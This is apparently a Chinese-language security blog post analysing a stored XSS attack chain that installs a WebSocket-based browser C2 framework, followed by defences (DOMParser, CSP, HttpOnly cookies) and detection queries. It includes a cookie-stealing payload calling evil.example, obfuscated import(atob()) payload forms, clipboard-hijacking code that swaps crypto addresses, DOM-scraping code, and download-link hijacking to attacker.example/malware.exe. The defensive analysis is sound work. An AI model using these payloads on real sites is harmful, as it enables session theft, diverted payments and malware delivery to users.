title: Stored XSS 到浏览器 C2：攻击链拆解与防御
date: 2026-05-21
tags: [security, xss, javascript, websocket, c2]
---

存储型 XSS 的经典危害是弹个 `alert(1)`，实际上攻击者能做的远不止于此。本文拆解一条真实出现过的完整攻击链：一段存储型 XSS 触发后，在受害者浏览器里挂载了一个功能完整的 C2（Command & Control）框架，通过 WebSocket 持久化控制，支持远程推送任意 JS 插件、实时回传 Cookie 和 DOM 数据。

<!--more-->

## 攻击链概览

整条链分三段：

1. **注入**：攻击者将含事件处理器的 HTML 写入持久化存储。
2. **触发**：前端在渲染某个"无害"预览时，用 DOM 解析了这段 HTML，事件处理器同步触发。
3. **驻留**：触发后动态加载一个外部 JS，建立 WebSocket 长连接，受害者浏览器变成 C2 节点。

注入到触发之间的关键是两个独立失效的防线：存储时 sanitization 没有覆盖到这个字段，渲染时使用了会触发副作用的 DOM API。单独失效任何一个都不够，两者叠加才构成可利用路径。

---

## 注入：Sanitization 的覆盖盲区

Web 应用通常在 API 边界做 HTML 清洗，但"边界覆盖"和"全量覆盖"之间有一个常被忽视的差距：

- 主路径（用户发消息、提交表单）做了 sanitization。
- 配置类字段（邮件模板、自动回复内容、系统通知文案）单独走一套更新接口，sanitization 逻辑可能是后来补的，也可能由不同的开发者维护。
- 内容在存储后还会被其他路径二次读取、复制到其他表——这些路径信任"已存储的内容是干净的"，不再清洗。

一旦某个配置字段的 sanitization 失效（字段名写错、逻辑分支没覆盖、正则写漏了某类标签），攻击者只需要写进去一次，所有后续读取该内容的路径都会拿到原始 HTML。

### 常见的注入载荷形式

```html
<!-- 经典，但很多 sanitizer 都会拦 -->
<script>fetch('//evil.example/steal?c='+document.cookie)</script>

<!-- 事件处理器，依赖标签和属性白名单是否严格 -->
<img src=x OnErRor="...">

<!-- 未闭合标签，绕过要求闭合标签的正则 sanitizer -->
<video src=x onerror="import(atob('...'))">

<!-- SVG / MathML 命名空间绕过 -->
<svg><animate onbegin="...">
```

base64 + 动态 `import()` 是近年常见的混淆手段——`import(atob('...'))` 不会出现可识别的 URL，只有在运行时才解码，静态扫描和部分 WAF 扫不到。

---

## 触发：`innerHTML` 赋值的隐藏副作用

这条攻击链里最反直觉的一环是触发位置：不是渲染最终内容的地方，而是一个"纯文本提取"工具函数。

很多前端代码用这个模式从 HTML 字符串里取纯文本：

```js
const div = document.createElement('div');
div.innerHTML = htmlString;          // 看起来无害：detached 节点
const text = div.textContent || '';
```

直觉上 detached 节点是安全的——它没有挂载到文档里，不会显示出来。但这个直觉是错的：

**`innerHTML` 赋值时，浏览器会立即解析 HTML 并触发资源加载。`<img src=x>`、`<video src=x>` 在 detached 节点上同样会发起网络请求，失败后同样会触发 `onerror`。`onerror` 在赋值语句执行期间同步运行。**

这意味着：

```js
div.innerHTML = '<video src="x" onerror="pwned()">';
// pwned() 在这一行执行完之前就已经被调用了
```

攻击载荷只需要是一个未闭合的 `<video>` 或 `<img>`（未闭合可以绕过只匹配 `<video>...</video>` 的正则过滤），`onerror` 就会在"纯文本提取"的瞬间触发。

### 安全替代方案

```js
// DOMParser 不触发资源加载，不执行事件处理器
const doc = new DOMParser().parseFromString(htmlString, 'text/html');
const text = doc.body.textContent || '';

// 或者：如果只需要剥离标签，纯正则就够，完全不过 DOM
const text = htmlString.replace(/<[^>]*>/g, '');
```

`DOMParser` 解析出来的文档是惰性的，不会发起网络请求，也不会执行任何事件处理器。这是从 HTML 提取纯文本最安全的方式。

---

## 驻留：浏览器 C2 框架

`onerror` 触发后执行的只是一行 `import('//attacker-domain/...')`，但加载进来的脚本是一个完整的 C2 框架，具备以下能力：

### 架构

| 组件 | 作用 |
|---|---|
| FingerprintJS | 生成稳定 `visitorId` 存 `localStorage`，跨 session 追踪受害者 |
| WebSocket 连接 | 建立到 C2 服务器的 `wss://` 长连接，指数退避自动重连 |
| 首次认证 | 连接即回传：`document.cookie`、平台信息、当前域名、campaign 标识 |
| 插件执行器 | 动态执行操作员推送的任意 JS 代码，支持单次 / 定时调度 |
| 结果回传 | 每个插件的返回值回传 C2（截断至固定字节数） |
| 单例守卫 | `window.__xssLibInitialized` 防止页面热重载时建立多条连接 |

### 操作员控制指令

| 指令类型 | 效果 |
|---|---|
| `execute_plugin` | 一次性执行操作员提供的 JS |
| `plugin_sync` | 清空当前所有插件，批量安装新插件集 |
| `plugin_start / stop` | 启停具名插件 |
| `kicked / banned` | 强制断连，清除所有插件（操作员侧的 kill switch） |

Cookie 在连接建立的瞬间已经发出去了，不需要操作员在线——框架是异步的，受害者上线后操作员随时可以接管。

### 攻击者能做什么

在受感染的浏览器 session 里，攻击者和登录用户的权限完全相同：

- 以用户身份调用后端任意 API（携带 session cookie）
- 读写页面可访问的所有存储（`localStorage`、`sessionStorage`、IndexedDB）
- 渲染任意 UI（钓鱼弹窗、诱导下载可执行文件）
- 在 CORS 允许范围内横向探测用户可达的内网地址

除了这些"显而易见"的能力，还有几类攻击值得单独提：

**剪贴板劫持**

```js
document.addEventListener('copy', e => {
    const selected = window.getSelection().toString();
    // 判断是否像加密货币地址，是则替换为攻击者地址
    if (/^(0x[0-9a-fA-F]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$/.test(selected.trim())) {
        e.clipboardData.setData('text/plain', ATTACKER_ADDRESS);
        e.preventDefault();
    }
});
```

用户在页面上复制一个钱包地址，粘贴出来的是攻击者的地址。这类攻击对加密货币转账场景尤其致命，受害者极少在粘贴后逐字核对。监听 `paste` 事件同样可以做：用户粘贴内容时替换掉。

**DOM 监听 + 实时数据抓取**

插件可以挂 `MutationObserver` 持续监听 DOM 变化，每当页面出现新内容就把感兴趣的节点文本回传——相当于一个持续运行的屏幕录制器，但只针对结构化数据：

```js
new MutationObserver(mutations => {
    for (const m of mutations) {
        const text = m.target.textContent;
        if (looksInteresting(text)) report(text);
    }
}).observe(document.body, { childList: true, subtree: true });
```

对于单页应用，用户在不同路由间切换、加载新数据时，Observer 都会持续触发，无需攻击者主动轮询。

**下载链接劫持**

```js
document.querySelectorAll('a[download]').forEach(a => {
    a.href = 'https://attacker.example/malware.exe';
    a.download = a.download || 'update.exe';
});

// 也可以用 MutationObserver 处理动态渲染出来的链接
```

页面上所有带 `download` 属性的链接，`href` 被替换为恶意文件。用户点击"下载报告"、"导出数据"时，下载到的是攻击者提供的可执行文件。结合一个看起来正常的文件名，社会工程学成本极低。

---

## 防御

### 1. Sanitization 下沉到数据层

不要只在 API 入口做 sanitization，要在数据写入的最底层（ORM hook、content handler、消息存储函数）再做一次。sanitization 是幂等操作，重复执行没有副作用。

这样做之后，即使某个上层入口的 sanitization 因为任何原因失效（字段名写错、逻辑分支遗漏、新增了一个绕过 API 边界的内部调用），底层仍然有兜底。

### 2. 不用 `innerHTML` 做文本处理

只要代码里出现 `element.innerHTML = untrustedString`，不管这个 element 是不是 detached，都要问一下：这个字符串真的可以信任吗？

用于纯文本提取时，换 `DOMParser`；需要渲染 HTML 时，先过 DOMPurify 再赋值。

### 3. Content Security Policy

CSP 是这条攻击链的最后一道防线——即使前两条都失效了，CSP 能阻断 C2 连接：

```
Content-Security-Policy:
  script-src 'self';
  connect-src 'self' wss://your-own-ws-host;
```

- `script-src 'self'` 阻止动态 `import()` 加载外域脚本。
- `connect-src 'self'` 阻止 WebSocket 连接到未授权的域。

注意：CSP 对已运行的脚本无效，已建立的 WebSocket 连接在页面重新加载之前不受影响。CSP 保护的是"新感染"，不能清除"已感染"。

### 4. Cookie 安全属性

Session cookie 必须设置 `HttpOnly`（JS 无法读取）、`Secure`（只走 HTTPS）、`SameSite=Lax`（限制跨站携带）。

`HttpOnly` 直接切断了 `document.cookie` 回传这条路，是最高优先级的加固项。它不能阻止攻击者用 JS 调用 API，但能让 Cookie 本身不被带走，失效处理更干净。

### 5. 感染后的清理

一旦确认存储型 XSS 存在，执行顺序：

1. 修复注入点，清除存储中的恶意内容（包括所有因内容扩散写入其他表的副本）
2. 强制失效所有受影响用户的 session（删除 session 记录或轮换 session secret）
3. 确认 Cookie 的 `HttpOnly` 属性存在，否则用户重新登录会立刻再次被窃取
4. 上线 CSP，阻断未来感染页面的 C2 连接

---

## 检测：在自己的应用里排查

### 前端：哪些地方用了 `innerHTML` 赋值

```bash
grep -rn "\.innerHTML\s*=" src/ --include="*.js" --include="*.ts" --include="*.vue" --include="*.jsx" --include="*.tsx"
```

逐一检查每个命中点：赋值的字符串是否来自用户输入或外部数据？如果是，这里就是潜在触发点。

### 后端：哪些字段/表存着 HTML 内容但没有经过 sanitization

重点关注配置类字段（模板、通知文案、自定义消息），这类字段往往由管理界面更新，sanitization 容易被遗漏。

### 数据库：扫描已注入的内容

```sql
-- 示例：扫描某个存 HTML 的字段
SELECT id, updated_at
FROM your_table
WHERE html_field ILIKE '%onerror%'
   OR html_field ILIKE '%<script%'
   OR html_field ILIKE '%javascript:%'
   OR html_field ILIKE '%import(%';
```

---

## 小结

| 环节 | 攻击者利用的弱点 | 防御方案 |
|---|---|---|
| 注入 | Sanitization 只覆盖主路径，配置字段有盲区 | sanitization 下沉到数据写入层，幂等兜底 |
| 触发 | `innerHTML` 赋值在 detached 节点上仍触发事件 | 改用 `DOMParser` 或纯正则提取文本 |
| 驻留 | 无 CSP，外域 WebSocket 畅通无阻 | `script-src 'self'` + `connect-src` 白名单 |
| 凭据 | Cookie 无 `HttpOnly`，JS 可直接读取 | Cookie 全量加 `HttpOnly` + `Secure` + `SameSite` |

Stored XSS 的危害上限不是 `alert(1)`，而是取决于攻击者愿意在 C2 上投入多少精力。这次分析的框架已经具备插件化架构和跨 session 持久化追踪，和传统的 BeEF 在能力上相差无几。防御的核心逻辑只有一条：**不要假设某个字段不会被攻击——在它被渲染之前，始终先清洗。**

---

## 参考

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN: DOMParser](https://developer.mozilla.org/en-US/docs/Web/API/DOMParser)
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [BeEF Project](https://beefproject.com/)
- [DOMPurify](https://github.com/cure53/DOMPurify)
